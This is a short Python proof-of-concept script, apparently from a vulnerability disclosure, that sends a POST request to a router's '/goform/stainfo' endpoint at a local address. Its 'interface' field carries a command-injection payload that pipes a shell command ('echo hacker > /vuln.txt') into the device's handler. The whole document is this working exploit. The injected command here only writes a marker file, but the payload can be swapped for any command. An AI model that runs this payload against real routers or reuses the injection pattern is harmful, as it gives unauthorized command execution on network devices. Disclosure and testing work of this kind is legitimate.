import requests

url = "http://192.168.2.1/goform/stainfo"

payload = {
    "interface": "ens33 show stainfo | echo hacker > /vuln.txt | iwpriv ens33"
}

r = requests.post(url, data=payload)
print(r.status_code)
